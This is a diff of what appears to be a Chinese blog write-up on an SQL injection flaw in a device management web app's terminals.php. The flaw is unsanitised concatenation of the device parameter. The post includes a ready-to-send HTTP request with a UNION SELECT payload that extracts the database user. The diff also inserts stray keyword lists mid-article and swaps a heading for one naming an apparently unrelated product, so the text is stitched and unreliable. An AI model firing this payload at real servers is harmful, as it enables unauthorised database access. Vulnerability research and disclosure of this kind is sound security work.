@@ -53,13 +53,21 @@ else if(1||$action == 'phonelist-bar'){
           $sqlstr = "select terminal_id,terminal_name,sum(terminal_session_num) as terminal_session_num from tbl_terminals_info where create_time >= $start_time and create_time < $stop_time $sqldevice group by terminal_id order by $flowname desc";
 ```
 
+深入探索
+
+编程
+
+客户关系管理
+
+网络安全咨询
+
 当用户通过 `newdevicezone` GET/POST参数提交以 `ip:` 为前缀的输入时，`ip:` 之后的部分会被提取并赋值给 `$device` 变量。此 `$device` 变量在后续构建 `$sqldevice` 字符串时，未经任何安全处理（如转义或参数化查询）便直接拼接到SQL查询语句 `and nodeid = $device` 中。这使得攻击者能够构造恶意的SQL代码片段，通过 `$newdevicezone` 参数注入到最终执行的SQL查询中，造成[SQL注入](https://mrxn.net/tag/SQL注入)[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "标签：漏洞")。
 
 # 漏洞复现
 
 [漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)利用示例
 
-代码注入检测
+孚盟云漏洞
 
 ## newdevicezone
 
@@ -74,14 +82,6 @@ Host: netmizer.mrxn.net
 GET /data/echart/terminals.php?action=phonelist-grid&device=-111+UNION+ALL+SELECT+null,CONCAT(0x7e,(select/**/user()),0x7e),null,null,null,null,null-- HTTP/1.1
 Host: netmizer.mrxn.net
 ```
-
-深入探索
-
-软件
-
-计算机服务器
-
-编程
 
 通过union注入，成功得到数据库用户信息
 
